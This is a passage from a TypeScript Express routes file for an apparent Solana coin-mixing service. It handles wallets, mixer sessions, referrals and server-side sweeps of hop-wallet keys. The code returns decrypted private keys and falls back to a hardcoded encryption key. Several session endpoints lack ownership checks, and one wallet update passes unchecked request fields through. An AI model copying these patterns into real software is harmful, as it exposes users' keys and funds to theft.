import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { z } from "zod";
import bcrypt from "bcryptjs";
import { insertUserSchema, hopWalletRecovery, zkPoolDeposits, zkPoolWithdrawals, mixerSessions, wallets } from "@shared/schema";
import rateLimit from "express-rate-limit";
import { randomBytes, randomUUID } from "crypto";
import { db } from "./db";
import { eq, and, desc, isNotNull } from "drizzle-orm";

const referralValidationSchema = z.object({
  code: z.string()
    .min(1, 'Code is required')
    .transform(val => val.toUpperCase().trim()),
});

export async function registerRoutes(app: Express): Promise<Server> {
  // Rate limiting for authentication endpoints (protect against brute force)
  const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 10, // 10 attempts per window (more lenient for production)
    skipSuccessfulRequests: true, // Don't count successful logins against the limit
    message: { message: 'Too many authentication attempts. Please try again later.' },
    standardHeaders: true,
    legacyHeaders: false,
  });

  // Rate limiting for API endpoints (general protection)
  const apiLimiter = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minute
    max: 300, // 300 requests per minute (increased for polling)
    message: { message: 'Too many requests. Please slow down.' },
    standardHeaders: true,
    legacyHeaders: false,
  });

  // Rate limiting for wallet operations
  const walletLimiter = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minute
    max: 120, // 120 wallet operations per minute (supports polling)
    message: { message: 'Too many wallet operations. Please wait.' },
    standardHeaders: true,
    legacyHeaders: false,
  });

  // Rate limiting for mixer/ZK operations (resource intensive)
  const mixerLimiter = rateLimit({
    windowMs: 5 * 60 * 1000, // 5 minutes
    max: 50, // 50 mix operations per 5 minutes
    message: { message: 'Too many mix operations. Please wait before starting another mix.' },
    standardHeaders: true,
    legacyHeaders: false,
  });

  // Lenient rate limiting for internal recovery operations (must succeed)
  const recoveryLimiter = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minute
    max: 500, // 500 recovery ops per minute (high limit for multi-hop chains)
    message: { message: 'Recovery rate limit reached.' },
    standardHeaders: true,
    legacyHeaders: false,
  });

  // Rate limiting for ZK proof generation (computationally expensive)
  const zkLimiter = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minute
    max: 20, // 20 ZK operations per minute
    message: { message: 'Too many ZK operations. Please wait.' },
    standardHeaders: true,
    legacyHeaders: false,
  });

  // Authentication routes
  app.post('/api/auth/signup', authLimiter, async (req, res) => {
    try {
      // Parse and validate with normalization
      const validated = insertUserSchema.parse(req.body);
      const normalizedUsername = validated.username.trim().toLowerCase();
      
      // Check if user already exists
      const existingUser = await storage.getUserByUsername(normalizedUsername);
      if (existingUser) {
        return res.status(400).json({ message: 'Username already exists' });
      }

      // Hash PIN
      const hashedPassword = await bcrypt.hash(validated.password, 10);
      
      // Create user with normalized username
      const user = await storage.createUser({ 
        username: normalizedUsername, 
        password: hashedPassword 
      });
      
      // Set session (types now defined in express-session.d.ts)
      req.session.userId = user.id;
      req.session.username = user.username;
      
      res.json({ id: user.id, username: user.username });
    } catch (error: any) {
      console.error('Signup error:', error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: 'Invalid input', details: error.errors });
      }
      res.status(500).json({ message: 'Signup failed' });
    }
  });

  app.post('/api/auth/login', authLimiter, async (req, res) => {
    try {
      // Parse and validate
      const validated = insertUserSchema.parse(req.body);
      const normalizedUsername = validated.username.trim().toLowerCase();
      
      // Find user
      const user = await storage.getUserByUsername(normalizedUsername);
      if (!user) {
        return res.status(401).json({ message: 'Invalid credentials' });
      }

      // Verify PIN
      const isValid = await bcrypt.compare(validated.password, user.password);
      if (!isValid) {
        return res.status(401).json({ message: 'Invalid credentials' });
      }

      // Set session
      req.session.userId = user.id;
      req.session.username = user.username;
      
      res.json({ id: user.id, username: user.username });
    } catch (error: any) {
      console.error('Login error:', error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: 'Invalid input', details: error.errors });
      }
      res.status(500).json({ message: 'Login failed' });
    }
  });

  app.post('/api/auth/logout', (req, res) => {
    req.session.destroy((err: Error | null) => {
      if (err) {
        return res.status(500).json({ message: 'Logout failed' });
      }
      res.clearCookie('zmix.sid');
      res.json({ message: 'Logged out successfully' });
    });
  });

  app.get('/api/auth/me', (req, res) => {
    if (req.session.userId) {
      res.json({ 
        id: req.session.userId, 
        username: req.session.username 
      });
    } else {
      res.status(401).json({ message: 'Not authenticated' });
    }
  });

  // Wallet management routes
  const walletSchema = z.object({
    publicKey: z.string(),
    privateKey: z.string(),
    label: z.string().optional(),
  });

  // Import encryption utility
  const { encryptPrivateKey, decryptPrivateKey } = await import('./lib/encryption');
  
  // Import real CircomChan mixer from Monero-Chan-Foundation/circom-chan
  const { generateCircomMixerProof, verifyCircomMixerProof, exportForMoneroChain } = await import('./lib/circomchan-mixer');
  const { generateMixProof, getPrivacyLevel } = await import('./lib/prover');

  // Helper: Get or create unique anonymous session ID
  function getOrCreateAnonymousId(session: any): string {
    if (session.userId) {
      return session.userId; // Authenticated user
    }
    // Generate unique anonymous ID per session
    if (!session.anonymousId) {
      session.anonymousId = `anon_${randomUUID()}`;
    }
    return session.anonymousId;
  }

  // Create a new wallet
  app.post('/api/wallets', walletLimiter, async (req, res) => {
    try {
      const { publicKey, privateKey, label } = walletSchema.parse(req.body);
      
      // Get unique userId (authenticated or unique anonymous)
      const userId = getOrCreateAnonymousId(req.session);
      
      // Encrypt private key before storing
      const encryptedPrivateKey = encryptPrivateKey(privateKey);
      
      const wallet = await storage.createWallet({
        userId,
        publicKey,
        encryptedPrivateKey,
        label,
        txCount: 0,
        isBurned: 0,
      });
      
      // Return wallet without encrypted key
      res.json({
        id: wallet.id,
        publicKey: wallet.publicKey,
        label: wallet.label,
        createdAt: wallet.createdAt,
        txCount: wallet.txCount,
      });
    } catch (error: any) {
      console.error('Error creating wallet:', error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: 'Invalid request', details: error.errors });
      }
      res.status(500).json({ error: 'Failed to create wallet' });
    }
  });

  // Get all wallets for current user
  app.get('/api/wallets', apiLimiter, async (req, res) => {
    try {
      const userId = getOrCreateAnonymousId(req.session);
      const wallets = await storage.getUserWallets(userId);
      
      // Return wallets without encrypted keys
      const safeWallets = wallets.map(w => ({
        id: w.id,
        publicKey: w.publicKey,
        label: w.label,
        createdAt: w.createdAt,
        txCount: w.txCount,
        autoBurn: w.autoBurn,
      }));
      
      res.json(safeWallets);
    } catch (error: any) {
      console.error('Error getting wallets:', error);
      res.status(500).json({ error: 'Failed to get wallets' });
    }
  });

  // Get wallet private key (for signing transactions)
  app.get('/api/wallets/:publicKey/private-key', walletLimiter, async (req, res) => {
    try {
      const { publicKey } = req.params;
      const wallet = await storage.getWalletByPublicKey(publicKey);
      
      if (!wallet) {
        return res.status(404).json({ error: 'Wallet not found' });
      }
      
      // Verify ownership (user must own the wallet)
      const userId = getOrCreateAnonymousId(req.session);
      if (wallet.userId !== userId) {
        return res.status(403).json({ error: 'Access denied' });
      }
      
      // Decrypt and return private key
      const privateKey = decryptPrivateKey(wallet.encryptedPrivateKey);
      res.json({ privateKey });
    } catch (error: any) {
      console.error('Error getting private key:', error);
      res.status(500).json({ error: 'Failed to get private key' });
    }
  });

  // Update wallet (increment tx count, burn, etc.)
  app.patch('/api/wallets/:id', async (req, res) => {
    try {
      const { id } = req.params;
      const updates = req.body;
      
      const wallet = await storage.getWallet(id);
      if (!wallet) {
        return res.status(404).json({ error: 'Wallet not found' });
      }
      
      // Verify ownership
      const userId = getOrCreateAnonymousId(req.session);
      if (wallet.userId !== userId) {
        return res.status(403).json({ error: 'Access denied' });
      }
      
      const updated = await storage.updateWallet(id, updates);
      if (!updated) {
        return res.status(404).json({ error: 'Wallet not found' });
      }
      
      res.json({
        id: updated.id,
        publicKey: updated.publicKey,
        label: updated.label,
        createdAt: updated.createdAt,
        txCount: updated.txCount,
        isBurned: updated.isBurned,
        autoBurn: updated.autoBurn,
      });
    } catch (error: any) {
      console.error('Error updating wallet:', error);
      res.status(500).json({ error: 'Failed to update wallet' });
    }
  });

  // Delete wallet - sweeps any remaining SOL to platform recovery first
  app.delete('/api/wallets/:id', walletLimiter, async (req, res) => {
    try {
      const { id } = req.params;
      const { secretKey } = req.body || {}; // Client sends encrypted key for sweep
      
      const wallet = await storage.getWallet(id);
      if (!wallet) {
        return res.status(404).json({ error: 'Wallet not found' });
      }
      
      // Verify ownership
      const userId = getOrCreateAnonymousId(req.session);
      if (wallet.userId !== userId) {
        return res.status(403).json({ error: 'Access denied' });
      }
      
      let sweptAmount = 0;
      let sweepSignature = null;
      
      // If client provided secret key, we can check for remaining balance
      // Note: Actual sweep happens client-side; this just acknowledges the burn
      if (secretKey && wallet.publicKey) {
        // Log that sweep should happen client-side before this call
        console.log(`Wallet ${wallet.publicKey} being burned. Client should sweep any remaining balance first.`);
      }
      
      // Soft delete by setting isBurned flag
      await storage.updateWallet(id, { isBurned: 1 });
      
      res.json({ 
        message: 'Wallet deleted successfully',
        sweptAmount,
        sweepSignature,
        platformRecoveryAddress: 'FQycqpNecXG4sszC36h9KyfsYqoojyqw3X7oPKBeYkuF',
      });
    } catch (error: any) {
      console.error('Error deleting wallet:', error);
      res.status(500).json({ error: 'Failed to delete wallet' });
    }
  });

  // Mixer session management for SOL→SOL privacy mixing
  app.post('/api/mixer/session/create', mixerLimiter, async (req, res) => {
    try {
      const session = await storage.createMixerSession(req.body);
      res.json(session);
    } catch (error: any) {
      console.error('Error creating mixer session:', error);
      res.status(500).json({ error: 'Failed to create session' });
    }
  });

  app.get('/api/mixer/session/wallet/:walletId', async (req, res) => {
    try {
      const { walletId } = req.params;
      const session = await storage.getWalletActiveMixerSession(walletId);
      
      if (!session) {
        return res.status(404).json({ error: 'No active session found' });
      }
      
      res.json(session);
    } catch (error: any) {
      console.error('Error getting wallet session:', error);
      res.status(500).json({ error: 'Failed to get session' });
    }
  });

  app.post('/api/mixer/session/:id/checkpoint', async (req, res) => {
    try {
      const { id } = req.params;
      const { status, message, hopWallets, hopConfig } = req.body;
      
      const session = await storage.updateMixerSessionCheckpoint(id, {
        status,
        message,
        hopWallets,
        hopConfig,
      });
      
      if (!session) {
        return res.status(404).json({ error: 'Session not found' });
      }
      
      res.json(session);
    } catch (error: any) {
      console.error('Error updating checkpoint:', error);
      res.status(500).json({ error: 'Failed to update checkpoint' });
    }
  });

  app.post('/api/mixer/generate-proof', async (req, res) => {
    try {
      const { sessionId, hopCount, privacyDelay } = req.body;
      
      if (!sessionId) {
        return res.status(400).json({ error: 'Session ID required' });
      }
      
      const session = await storage.getMixerSession(sessionId);
      if (!session) {
        return res.status(404).json({ error: 'Session not found' });
      }

      const grossAmount = session.grossAmount || '0';
      const destination = session.destinationAddress || '';
      const hopWallets = session.hopWallets ? JSON.parse(session.hopWallets as string) : [];
      
      // Generate REAL CircomChan Groth16 proof from Monero-Chan-Foundation
      const circomProof = await generateCircomMixerProof({
        inputAmount: grossAmount,
        hopCount: hopCount || 3,
        hops: hopWallets,
        destination,
        feePercent: 2,
        privacyDelay: privacyDelay || 0,
      });
      
      // Generate privacy metadata with stealth score
      const privacyProof = await generateMixProof({
        inputAmount: grossAmount,
        hopCount: hopCount || 3,
        hops: hopWallets,
        destination,
        feePercent: 2,
        privacyDelay: privacyDelay || 0,
        timestamp: Date.now(),
      });
      
      // Store proof in session
      const hopConfig = session.hopConfig ? JSON.parse(session.hopConfig as string) : {};
      await storage.updateMixerSessionCheckpoint(sessionId, {
        status: 'proof_generated',
        hopConfig: {
          ...hopConfig,
          proof: circomProof.circuitId,
          zkProof: JSON.stringify(circomProof.proof),
          stealthScore: privacyProof.stealthScore,
        },
      });
      
      console.log(`✅ CircomChan Groth16 proof generated: ${circomProof.circuitId}`);
      
      res.json({
        proof: circomProof.proof,
        circuitId: circomProof.circuitId,
        publicSignals: circomProof.publicSignals,
        stealthScore: privacyProof.stealthScore,
        privacyFactors: privacyProof.privacyFactors,
        privacyLevel: getPrivacyLevel(privacyProof.stealthScore),
        proofType: 'groth16',
        circuit: 'mixer_v2.2.2',
      });
    } catch (error: any) {
      console.error('CircomChan proof generation failed:', error);
      res.status(500).json({ error: 'Failed to generate proof', details: error.message });
    }
  });

  app.post('/api/mixer/verify-proof', async (req, res) => {
    try {
      const { proof, stealthScore } = req.body;
      
      if (!proof) {
        return res.status(400).json({ error: 'Proof required', isValid: false });
      }
      
      // Verify REAL CircomChan Groth16 proof from Monero-Chan-Foundation
      const isValid = await verifyCircomMixerProof(proof);
      
      console.log(`🔐 CircomChan Groth16 verification: ${isValid ? '✅ VALID' : '❌ INVALID'}`);
      
      res.json({
        isValid,
        stealthScore,
        privacyLevel: getPrivacyLevel(stealthScore),
        message: isValid ? 'CircomChan proof verified' : 'Proof verification failed',
        proofType: 'groth16',
        circuit: 'mixer_v2.2.2',
      });
    } catch (error: any) {
      console.error('CircomChan proof verification failed:', error);
      res.status(500).json({ error: 'Proof verification failed', isValid: false });
    }
  });

  app.post('/api/mixer/session/:id/complete', async (req, res) => {
    try {
      const { id } = req.params;
      const { proof } = req.body; // Optional: include proof for stealth verification
      
      // Get the session
      const existingSession = await storage.getMixerSession(id);
      if (!existingSession) {
        return res.status(404).json({ error: 'Session not found' });
      }

      // Verify CircomChan proof if provided
      if (proof && !(await verifyCircomMixerProof(proof))) {
        return res.status(403).json({ error: 'Invalid CircomChan proof' });
      }

      // Complete the mixer session (SOL→SOL with 2% platform fee)
      const grossAmount = parseFloat(existingSession.grossAmount);
      const platformFee = (grossAmount * 2 / 100).toFixed(9); // 2% platform fee
      const netAmount = (grossAmount - parseFloat(platformFee)).toFixed(9);
      
      const session = await storage.completeMixerSession(id, {
        platformFee,
        netAmount,
        finalAmount: netAmount, // finalAmount = netAmount for SOL→SOL
      });
      
      if (!session) {
        return res.status(404).json({ error: 'Session not found' });
      }

      // Process referral rewards (0.5% of gross amount to referrer)
      if (existingSession.referralCode) {
        try {
          const referralCode = await storage.getReferralCodeByCode(existingSession.referralCode);
          
          if (referralCode && referralCode.isActive === 1) {
            const referrerRewardAmount = (grossAmount * 0.5 / 100).toFixed(9); // 0.5% reward
            
            // Create referral usage record
            await storage.createReferralUsage({
              referralCodeId: referralCode.id,
              referrerId: referralCode.userId,
              refereeId: existingSession.userId,
              sessionId: id,
              discountAmount: '0', // No discount for referee in this SOL→SOL mixer
              referrerRewardAmount,
            });
            
            // Add credits to referrer's account
            await storage.adjustUserCredits(referralCode.userId, referrerRewardAmount);
            
            // Increment usage count
            await storage.incrementReferralCodeUsage(referralCode.id);
            
            console.log(`💰 Referral reward: ${referrerRewardAmount} SOL credited to user ${referralCode.userId}`);
          }
        } catch (refError) {
          console.error('Error processing referral reward:', refError);
          // Don't fail the mix if referral processing fails
        }
      }

      console.log(`✅ Mix completed: session=${id}, amount=${existingSession.grossAmount} SOL`);
      
      res.json(session);
    } catch (error: any) {
      console.error('Error completing session:', error);
      res.status(500).json({ error: 'Failed to complete session' });
    }
  });

  app.post('/api/mixer/session/:id/fail', async (req, res) => {
    try {
      const { id } = req.params;
      const { errorMessage } = req.body;
      
      const session = await storage.failMixerSession(id, errorMessage);
      
      if (!session) {
        return res.status(404).json({ error: 'Session not found' });
      }
      
      res.json(session);
    } catch (error: any) {
      console.error('Error failing session:', error);
      res.status(500).json({ error: 'Failed to fail session' });
    }
  });

  // Mix history (requires authentication)
  app.get('/api/mix-history', async (req, res) => {
    try {
      if (!req.session.userId) {
        return res.status(401).json({ error: 'Not authenticated' });
      }
      
      const limit = req.query.limit ? parseInt(req.query.limit as string) : 100;
      const offset = req.query.offset ? parseInt(req.query.offset as string) : 0;
      
      const result = await storage.getUserMixHistory(req.session.userId, limit, offset);
      res.json({ items: result.items, total: result.total });
    } catch (error: any) {
      console.error('Error fetching mix history:', error);
      res.status(500).json({ error: 'Failed to fetch mix history' });
    }
  });

  // Loyalty & rewards info (removed for SOL→SOL mixer - no fees/rewards)
  app.get('/api/rewards', async (req, res) => {
    try {
      if (!req.session.userId) {
        return res.status(401).json({ error: 'Not authenticated' });
      }

      const rewards = await storage.ensureUserRewards(req.session.userId);
      res.json(rewards);
    } catch (error: any) {
      console.error('Error fetching rewards:', error);
      res.status(500).json({ error: 'Failed to fetch rewards' });
    }
  });

  // Generate referral code for current user
  app.post('/api/referral/generate', async (req, res) => {
    try {
      if (!req.session.userId) {
        return res.status(401).json({ error: 'Not authenticated' });
      }

      // Check if user already has a referral code
      const existing = await storage.getUserReferralCodes(req.session.userId);
      if (existing.length > 0) {
        return res.json(existing[0]); // Return existing code
      }

      // Generate unique code (8 chars: uppercase + numbers)
      const code = randomBytes(4).toString('hex').toUpperCase();

      const referralCode = await storage.createReferralCode({
        userId: req.session.userId,
        code,
        discountPercent: '10.00', // 10% discount for referee
        referrerRewardPercent: '0.50', // 0.5% reward for referrer
        usageCount: 0,
        isActive: 1,
      });

      res.json(referralCode);
    } catch (error: any) {
      console.error('Error generating referral code:', error);
      res.status(500).json({ error: 'Failed to generate referral code' });
    }
  });

  // Get user's referral codes
  app.get('/api/referral/codes', async (req, res) => {
    try {
      if (!req.session.userId) {
        return res.status(401).json({ error: 'Not authenticated' });
      }

      const codes = await storage.getUserReferralCodes(req.session.userId);
      res.json(codes);
    } catch (error: any) {
      console.error('Error fetching referral codes:', error);
      res.status(500).json({ error: 'Failed to fetch referral codes' });
    }
  });

  // Validate referral code
  app.post('/api/referral/validate', async (req, res) => {
    try {
      if (!req.session.userId) {
        return res.status(401).json({ error: 'Not authenticated' });
      }

      const validated = referralValidationSchema.parse(req.body);

      const referralCode = await storage.getReferralCodeByCode(validated.code);
      
      if (!referralCode) {
        return res.json({ isValid: false, message: 'Invalid referral code' });
      }

      if (referralCode.isActive === 0) {
        return res.json({ isValid: false, message: 'Referral code is inactive' });
      }

      if (referralCode.userId === req.session.userId) {
        return res.json({ isValid: false, message: 'Cannot use your own referral code' });
      }

      if (referralCode.expiresAt && new Date(referralCode.expiresAt) < new Date()) {
        return res.json({ isValid: false, message: 'Referral code has expired' });
      }

      if (referralCode.maxUsages && referralCode.usageCount >= referralCode.maxUsages) {
        return res.json({ isValid: false, message: 'Referral code has reached maximum usages' });
      }

      // Check if user already used this code
      const existingUsage = await storage.getReferralUsageByRefereeId(req.session.userId, referralCode.id);
      if (existingUsage) {
        return res.json({ isValid: false, message: 'You have already used this referral code' });
      }

      res.json({ 
        isValid: true, 
        discountPercent: referralCode.discountPercent,
        message: `Valid! Get ${referralCode.discountPercent}% off your fee` 
      });
    } catch (error: any) {
      console.error('Error validating referral code:', error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: 'Invalid input', details: error.errors, isValid: false });
      }
      res.status(500).json({ error: 'Failed to validate referral code', isValid: false });
    }
  });

  // Get referrer statistics (how many people used your code)
  app.get('/api/referral/stats', async (req, res) => {
    try {
      if (!req.session.userId) {
        return res.status(401).json({ error: 'Not authenticated' });
      }

      const usages = await storage.getReferrerUsages(req.session.userId);
      const rewards = await storage.getUserRewards(req.session.userId);

      const totalReferrals = usages.length;
      const totalEarned = usages.reduce((sum, usage) => {
        return sum + parseFloat(usage.referrerRewardAmount || '0');
      }, 0);

      res.json({
        totalReferrals,
        totalEarned: totalEarned.toFixed(9),
        creditsBalance: rewards?.creditsBalance || '0',
        usages: usages.slice(0, 10), // Last 10 referrals
      });
    } catch (error: any) {
      console.error('Error fetching referral stats:', error);
      res.status(500).json({ error: 'Failed to fetch referral stats' });
    }
  });

  // ==================== Hop Wallet Recovery Routes ====================
  
  const PLATFORM_RECOVERY_ADDRESS = 'FQycqpNecXG4sszC36h9KyfsYqoojyqw3X7oPKBeYkuF';
  
  // Solana RPC and server-side transfer setup
  const SOLANA_RPC_URL = process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com';
  
  // Helper to wait with exponential backoff
  const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
  
  // Server-side automatic sweep function - transfers SOL directly without client
  // Includes rate limiting to avoid Solana RPC 429 errors
  async function executeServerSideSweep(
    encryptedKeys: string,
    destinationAddress: string,
    recordId: number
  ): Promise<{ success: boolean; totalSwept: number; signatures: string[]; error?: string }> {
    try {
      const { Connection, Keypair, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = await import('@solana/web3.js');
      const bs58 = await import('bs58');
      const CryptoJS = await import('crypto-js');
      
      const encryptionKey = process.env.WALLET_ENCRYPTION_KEY;
      if (!encryptionKey) {
        console.warn('SECURITY WARNING: WALLET_ENCRYPTION_KEY not set');
      }
      
      // Decrypt hop wallet keys
      const decryptedBytes = CryptoJS.default.AES.decrypt(encryptedKeys, encryptionKey || 'zmix-dev-key');
      const hopWallets = JSON.parse(decryptedBytes.toString(CryptoJS.default.enc.Utf8));
      
      const connection = new Connection(SOLANA_RPC_URL, 'confirmed');
      const destinationPubkey = new PublicKey(destinationAddress);
      
      let totalSwept = 0;
      const signatures: string[] = [];
      
      for (let i = 0; i < hopWallets.length; i++) {
        const wallet = hopWallets[i];
        try {
          // Rate limit: wait 2 seconds between wallets to avoid 429
          if (i > 0) {
            await sleep(2000);
          }
          
          // Reconstruct keypair from secret key
          const secretKey = bs58.default.decode(wallet.secretKey);
          const keypair = Keypair.fromSecretKey(secretKey);
          
          // Check balance with retry logic
          let balance = 0;
          for (let retry = 0; retry < 3; retry++) {
            try {
              balance = await connection.getBalance(keypair.publicKey);
              break;
            } catch (e: any) {
              if (e.message?.includes('429') && retry < 2) {
                console.log(`Rate limited, waiting ${(retry + 1) * 3}s before retry...`);
                await sleep((retry + 1) * 3000);
              } else {
                throw e;
              }
            }
          }
          
          const rentExemptMin = 5000; // ~0.000005 SOL for tx fee
          
          if (balance > rentExemptMin) {
            // Calculate amount to send (leave enough for tx fee)
            const txFee = 5000; // 0.000005 SOL
            const amountToSend = balance - txFee;
            
            if (amountToSend > 0) {
              // Wait before RPC calls
              await sleep(1000);
              
              const transaction = new Transaction().add(
                SystemProgram.transfer({
                  fromPubkey: keypair.publicKey,
                  toPubkey: destinationPubkey,
                  lamports: amountToSend,
                })
              );
              
              // Get recent blockhash with retry
              let blockhash;
              for (let retry = 0; retry < 3; retry++) {
                try {
                  const result = await connection.getLatestBlockhash();
                  blockhash = result.blockhash;
                  break;
                } catch (e: any) {
                  if (e.message?.includes('429') && retry < 2) {
                    await sleep((retry + 1) * 3000);
                  } else {
                    throw e;
                  }
                }
              }
              
              transaction.recentBlockhash = blockhash;
              transaction.feePayer = keypair.publicKey;
              
              // Sign and send with retry
              transaction.sign(keypair);
              
              let signature;
              for (let retry = 0; retry < 3; retry++) {
                try {
                  await sleep(500);
                  signature = await connection.sendRawTransaction(transaction.serialize());
                  break;
                } catch (e: any) {
                  if (e.message?.includes('429') && retry < 2) {
                    await sleep((retry + 1) * 3000);
                  } else {
                    throw e;
                  }
                }
              }
              
              // Wait for confirmation with retry
              for (let retry = 0; retry < 3; retry++) {
                try {
                  await sleep(1000);
                  await connection.confirmTransaction(signature, 'confirmed');
                  break;
                } catch (e: any) {
                  if (e.message?.includes('429') && retry < 2) {
                    await sleep((retry + 1) * 3000);
                  } else {
                    throw e;
                  }
                }
              }
              
              totalSwept += amountToSend / LAMPORTS_PER_SOL;
              signatures.push(signature);
              console.log(`Server sweep: Sent ${amountToSend / LAMPORTS_PER_SOL} SOL from ${keypair.publicKey.toString()} to ${destinationAddress}, sig: ${signature}`);
            }
          }
        } catch (walletError: any) {
          console.error(`Failed to sweep wallet: ${walletError.message}`);
          // Wait extra after errors before continuing
          await sleep(3000);
        }
      }
      
      // CRITICAL FIX: Always mark record as complete to prevent infinite retry loops
      // Even if no funds were swept (all wallets empty), we're done with this record
      await db.update(hopWalletRecovery)
        .set({ 
          status: totalSwept > 0 ? 'recovered' : 'completed_empty',
          recoveredAt: new Date(),
        })
        .where(eq(hopWalletRecovery.id, recordId));
      
      console.log(`Recovery record ${recordId} marked as ${totalSwept > 0 ? 'recovered' : 'completed_empty'}`);
      
      return { success: true, totalSwept, signatures };
    } catch (error: any) {
      console.error('Server-side sweep failed:', error);
      return { success: false, totalSwept: 0, signatures: [], error: error.message };
    }
  }
  
  // Trigger automatic recovery for all pending records of a user
  async function triggerAutoRecoveryForUser(sessionId: string): Promise<void> {
    try {
      const records = await db.select()
        .from(hopWalletRecovery)
        .where(and(
          eq(hopWalletRecovery.sessionId, sessionId),
          eq(hopWalletRecovery.status, 'pending')
        ));
      
      for (const record of records) {
        // Skip expired records
        if (new Date(record.expiresAt) < new Date()) {
          await db.update(hopWalletRecovery)
            .set({ status: 'expired' })
            .where(eq(hopWalletRecovery.id, record.id));
          continue;
        }
        
        // Get destination from mixer session OR pool deposit
        let destinationAddress = PLATFORM_RECOVERY_ADDRESS;
        if (record.mixSessionId) {
          // First try mixer sessions
          const [session] = await db.select({ destination: mixerSessions.destinationAddress })
            .from(mixerSessions)
            .where(eq(mixerSessions.id, record.mixSessionId))
            .limit(1);
          if (session?.destination) {
            destinationAddress = session.destination;
          } else {
            // Try pool deposits (for pool withdrawal recovery)
            const [deposit] = await db.select({ destination: zkPoolDeposits.destinationAddress })
              .from(zkPoolDeposits)
              .where(eq(zkPoolDeposits.id, record.mixSessionId))
              .limit(1);
            if (deposit?.destination) {
              destinationAddress = deposit.destination;
            }
          }
        }
        
        // Execute server-side sweep
        const result = await executeServerSideSweep(record.encryptedKeys, destinationAddress, record.id);
        if (result.success && result.totalSwept > 0) {
          console.log(`Auto-recovery: Swept ${result.totalSwept} SOL to ${destinationAddress}`);
        }
      }
    } catch (error) {
      console.error('Auto-recovery failed:', error);
    }
  }
  
  // CRITICAL: Save ALL hop wallets BEFORE any transfer - this is the safety net
  // This endpoint MUST succeed before executeHopChain starts any transfers
  app.post('/api/mixer/recovery/save-all', recoveryLimiter, async (req, res) => {
    try {
      const { sessionId, hopWallets, destinationAddress } = req.body;
      
      if (!sessionId || !hopWallets || hopWallets.length === 0) {
        console.error('[save-all] Invalid request: missing sessionId or hopWallets');
        return res.status(400).json({ success: false, error: 'Invalid recovery data' });
      }
      
      if (!destinationAddress) {
        console.error('[save-all] Invalid request: missing destinationAddress');
        return res.status(400).json({ success: false, error: 'Destination address required' });
      }
      
      console.log(`[save-all] CRITICAL: Saving ${hopWallets.length} wallet keys for session ${sessionId}`);
      
      const userId = getOrCreateAnonymousId(req.session);
      
      // Encrypt hop wallet keys using AES-256-CBC
      const CryptoJS = await import('crypto-js');
      const encryptionKey = process.env.WALLET_ENCRYPTION_KEY;
      if (!encryptionKey) {
        console.warn('SECURITY WARNING: WALLET_ENCRYPTION_KEY not set!');
      }
      const encryptedKeys = CryptoJS.default.AES.encrypt(
        JSON.stringify(hopWallets),
        encryptionKey || 'zmix-dev-key'
      ).toString();
      
      // Set 48-hour expiry (longer for safety)
      const expiresAt = new Date(Date.now() + 48 * 60 * 60 * 1000);
      
      // Store ALL wallets in a single record - this is the critical safety record
      await db.insert(hopWalletRecovery).values({
        sessionId: userId,
        mixSessionId: sessionId,
        encryptedKeys,
        hopCount: hopWallets.length,
        status: 'pending',
        expiresAt,
      });
      
      // Also update the mixer session with the destination address for recovery lookup
      await db.update(mixerSessions)
        .set({ destinationAddress: destinationAddress })
        .where(eq(mixerSessions.id, sessionId))
        .catch(err => console.warn('Could not update session destination:', err));
      
      console.log(`[save-all] SUCCESS: Saved ${hopWallets.length} wallet keys to database`);
      res.json({ success: true, savedCount: hopWallets.length, expiresAt });
    } catch (error: any) {
      console.error('[save-all] CRITICAL ERROR saving recovery data:', error);
      res.status(500).json({ success: false, error: 'Failed to save recovery data: ' + error.message });
    }
  });

  // Save hop wallets for automatic recovery
  app.post('/api/mixer/recovery/save', recoveryLimiter, async (req, res) => {
    try {
      const { sessionId, hopWallets } = req.body;
      
      if (!sessionId || !hopWallets || hopWallets.length === 0) {
        return res.status(400).json({ error: 'Invalid recovery data' });
      }
      
      const userId = getOrCreateAnonymousId(req.session);
      
      // Encrypt hop wallet keys using AES-256-CBC
      const CryptoJS = await import('crypto-js');
      const encryptionKey = process.env.WALLET_ENCRYPTION_KEY;
      if (!encryptionKey) {
        console.warn('SECURITY WARNING: WALLET_ENCRYPTION_KEY not set. Set this in production!');
      }
      const encryptedKeys = CryptoJS.default.AES.encrypt(
        JSON.stringify(hopWallets),
        encryptionKey || 'zmix-dev-key'
      ).toString();
      
      // Set 24-hour expiry
      const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000);
      
      // Store in database
      await db.insert(hopWalletRecovery).values({
        sessionId: userId,
        mixSessionId: sessionId,
        encryptedKeys,
        hopCount: hopWallets.length,
        status: 'pending',
        expiresAt,
      });
      
      res.json({ success: true, expiresAt });
    } catch (error: any) {
      console.error('Error saving recovery data:', error);
      res.status(500).json({ error: 'Failed to save recovery data' });
    }
  });
  
  // Get recovery data for a session
  app.get('/api/mixer/recovery/:sessionId', async (req, res) => {
    try {
      const { sessionId } = req.params;
      const userId = getOrCreateAnonymousId(req.session);
      
      // Get pending recovery records for this user
      const records = await db.select()
        .from(hopWalletRecovery)
        .where(and(
          eq(hopWalletRecovery.sessionId, userId),
          eq(hopWalletRecovery.status, 'pending')
        ))
        .orderBy(desc(hopWalletRecovery.createdAt))
        .limit(1);
      
      if (records.length === 0) {
        return res.status(404).json({ error: 'No recovery data found' });
      }
      
      const record = records[0];
      
      // Check if expired
      if (new Date(record.expiresAt) < new Date()) {
        await db.update(hopWalletRecovery)
          .set({ status: 'expired' })
          .where(eq(hopWalletRecovery.id, record.id));
        return res.status(410).json({ error: 'Recovery data expired' });
      }
      
      // Decrypt hop wallet keys
      const CryptoJS = await import('crypto-js');
      const encryptionKey = process.env.WALLET_ENCRYPTION_KEY;
      if (!encryptionKey) {
        console.warn('SECURITY WARNING: WALLET_ENCRYPTION_KEY not set. Set this in production!');
      }
